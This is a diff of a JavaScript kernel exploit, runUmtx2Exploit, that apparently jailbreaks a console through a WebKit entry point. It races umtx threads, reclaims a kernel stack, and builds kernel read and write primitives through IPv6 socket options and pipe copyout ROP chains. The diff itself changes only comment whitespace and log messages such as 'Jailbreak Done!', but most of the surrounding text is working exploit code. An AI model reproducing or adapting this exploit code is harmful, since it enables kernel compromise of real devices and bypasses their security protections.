@@ -1,40 +1,40 @@
 // @ts-check
 
-/** 
+/**
  * @typedef {Object} KernelRW
- * 
+ *
  * @property {number} masterSock
  * @property {number} victimSock
- * 
+ *
  * @property {int64} kdataBase
  * @property {int64} ktextBase
- * 
+ *
  * @property {function(int64):Promise<number>} read1
  * @property {function(int64):Promise<number>} read2
  * @property {function(int64):Promise<number>} read4
  * @property {function(int64):Promise<int64>} read8
- * 
+ *
  * @property {function(int64, number):Promise<void>} write1
  * @property {function(int64, number):Promise<void>} write2
  * @property {function(int64, number):Promise<void>} write4
  * @property {function(int64, int64):Promise<void>} write8
- * 
+ *
  * @property {int64} curthrAddr
  * @property {int64} curprocAddr
  * @property {int64} procUcredAddr
  * @property {int64} procFdAddr
- * 
+ *
  * @property {int64} pipeMem
  * @property {int64} pipeAddr
- * 
+ *
  */
 
 
 /**
- * @param {WebkitPrimitives} p 
- * @param {worker_rop} chain 
- * @param {function(string, LogLevel):Promise<void>} [log] 
- * @returns 
+ * @param {WebkitPrimitives} p
+ * @param {worker_rop} chain
+ * @param {function(string, LogLevel):Promise<void>} [log]
+ * @returns
  */
 async function runUmtx2Exploit(p, chain, log = async () => { }) {
     const totalStartTime = performance.now();
@@ -43,7 +43,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
     const doInvalidKstackMunmap = true;
 
     /**
-     * @param {number} ms 
+     * @param {number} ms
      * @returns {string}
      */
     function toHumanReadableTime(ms) {
@@ -95,7 +95,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
     let bumpAllocatorPos = 0;
 
     /**
-     * @param {number} size 
+     * @param {number} size
      * @returns {int64}
      */
     function alloc(size) {
@@ -109,8 +109,8 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
     }
 
     /**
-     * 
-     * @param {int64} mask_addr 
+     *
+     * @param {int64} mask_addr
      * @returns {number}
      */
     function getCoreIndex(mask_addr) {
@@ -151,9 +151,9 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
     const PRI_TIMESHARE = 3; /* Time sharing process. */
     const PRI_IDLE = 4;      /* Idle process. */
     /**
-     * @param {number} type 
-     * @param {number} [prio] 
-     * @param {number} [prio_type] 
+     * @param {number} type
+     * @param {number} [prio]
+     * @param {number} [prio_type]
      */
     async function rtprio(type, prio = 0, prio_type = PRI_REALTIME) {
         const rtprio = alloc(0x4);
@@ -173,8 +173,8 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
     }
 
     /**
-     * @param {number} prio 
-     * @param {number} prio_type 
+     * @param {number} prio
+     * @param {number} prio_type
      */
     async function setRtprio(prio, prio_type = PRI_REALTIME) {
         return await rtprio(RTP_SET, prio, prio_type);
@@ -188,8 +188,8 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
     }
 
     /**
-     * @param {rop} thread 
-     * @param {number} prio 
+     * @param {rop} thread
+     * @param {number} prio
      */
     function threadSetRtPrio(thread, prio) {
         const rtprio = alloc(0x4);
@@ -201,7 +201,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
 
 
     /**
-     * @param {number} core 
+     * @param {number} core
      */
     async function pinToCore(core) {
         const level = 3;
@@ -215,8 +215,8 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
     }
 
     /**
-     * @param {rop} thread 
-     * @param {number} core 
+     * @param {rop} thread
+     * @param {number} core
      */
     function threadPinToCore(thread, core) {
         const level = 3;
@@ -231,10 +231,10 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
 
 
     /**
-     * @param {thread_rop} thread 
-     * @param {int64} addr 
-     * @param {number} branch_type 
-     * @param {int64|number} compare_value 
+     * @param {thread_rop} thread
+     * @param {int64} addr
+     * @param {number} branch_type
+     * @param {int64|number} compare_value
      */
     function threadWaitWhile(thread, addr, branch_type, compare_value, dereference_compare_value = false) {
         thread.while(addr, branch_type, compare_value, dereference_compare_value, () => {
@@ -677,8 +677,8 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
 
 
     /**
-     * 
-     * @param {int64} kstack 
+     *
+     * @param {int64} kstack
      * @returns {number|null} - kprim id
      */
     function verifyKstack(kstack) {
@@ -792,7 +792,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         await lookupThread.spawn_thread();
         await destroyerThread0.spawn_thread();
         await destroyerThread1.spawn_thread();
-        if (debug) await log("Spawned threads, waiting for them to be ready...", LogLevel.DEBUG);
+        if (debug) await log("▶︎ Triggering race\n[UMTX] Please wait ...", LogLevel.DEBUG);
 
         await waitForRaceThreadsState(threadStatus.READY);
         if (debug) await log("All threads ready", LogLevel.DEBUG);
@@ -803,14 +803,14 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         const mainFdSizeBuf = alloc(0x8);
 
         const beforeRaceTime = performance.now();
-        await log("Triggering race...", LogLevel.LOG);
+        await log("▶︎ Triggering race\n[UMTX] Please wait ...", LogLevel.LOG);
 
         for (let i2 = 0; i2 < config.max_race_attempts; i2++) {
             if (i2 % 2 == 0) {
                 if (debug) {
-                    await log(`Race attempt ${i}-${i2} (mem access fail count: ${checkMemoryAccessFailCount})`, LogLevel.INFO | LogLevel.FLAG_TEMP);
+                    await log(`▶︎ Triggering race attempt\n ${i}-${i2} (fail : ${checkMemoryAccessFailCount})`, LogLevel.INFO | LogLevel.FLAG_TEMP);
                 } else {
-                    await log(`Race attempt ${i}-${i2}`, LogLevel.INFO | LogLevel.FLAG_TEMP);
+                    await log(`▶︎ Triggering race attempt\n ${i}-${i2}`, LogLevel.INFO | LogLevel.FLAG_TEMP);
                 }
             }
 
@@ -1018,7 +1018,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         p.write8(kprimCommonData.thr_index, kprimId);
         p.write8(kprimCommonData.exit, 1);
 
-        await log(`Successfully reclaimed kstack (kprim_id = ${kprimId})`, LogLevel.SUCCESS);
+        await log(`★ Jailbreak Done! (kprim_id = ${kprimId})`, LogLevel.SUCCESS);
         if (debug) await log("Waiting for all kprim threads to exit (except the winner thread)...", LogLevel.DEBUG);
 
         await waitForKprimThreadsState(threadStatus.EXITED, config.num_kprim_threads - 1);
@@ -1147,9 +1147,9 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
 
     const kstackKrwWriteBuf = alloc(0x8);
     /**
-     * 
-     * @param {int64} kaddr 
-     * @param {int64|number} val 
+     *
+     * @param {int64} kaddr
+     * @param {int64|number} val
      */
     async function kstackKrwWriteQword(kaddr, val) {
         p.write8(kstackKrwWriteBuf, val);
@@ -1233,7 +1233,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         chainPushWriteToVictim(addr);
         chain.self_healing_syscall(SYS_GETSOCKOPT, victimSock, IPPROTO_IPV6, IPV6_PKTINFO, buffer, pktinfoSizeStore);
     }
-    
+
     function chainPushIPv6Kwrite(addr, buffer) {
         chainPushWriteToVictim(addr);
         chain.self_healing_syscall(SYS_SETSOCKOPT, victimSock, IPPROTO_IPV6, IPV6_PKTINFO, buffer, 0x14);
@@ -1243,7 +1243,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         chainPushIPv6Kwrite(addr, buffer);
         await chain.run();
     }
-    
+
     async function ipv6_kread8(addr) {
         chainPushIPv6Kread(addr, slaveBuffer);
         await chain.run();
@@ -1261,12 +1261,12 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
     const pipeAddr = await ipv6_kread8(pipeFile);
 
     /**
-     * 
+     *
      * @param {int64} src
      * @param {boolean} dereferenceSrc
-     * @param {int64} dest 
+     * @param {int64} dest
      * @param {boolean} dereferenceDest
-     * @param {number} length 
+     * @param {number} length
      */
     function chainPushCopyout(src, dereferenceSrc, dest, dereferenceDest, length) {
         chain.push_write8(pipemapBuffer, chainPushCopyout.value0);
@@ -1289,8 +1289,8 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
     chainPushCopyout.value0 = new int64(0x40000000, 0x40000000);
     chainPushCopyout.value1 = new int64(0x00000000, 0x40000000);
 
-    /** 
-     * 
+    /**
+     *
      * @param {int64} src
      * @param {boolean} extraDereferenceSrc
      * @param {int64} dest
@@ -1422,7 +1422,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
     if (!fdsToFix.includes(winnerLookupFd)) {
         fdsToFix.push(winnerLookupFd);
     }
-    
+
     await log("Creating fixup chain...", LogLevel.INFO);
     chainPushIncSocketRefcount(masterSock);
     chainPushIncSocketRefcount(victimSock);
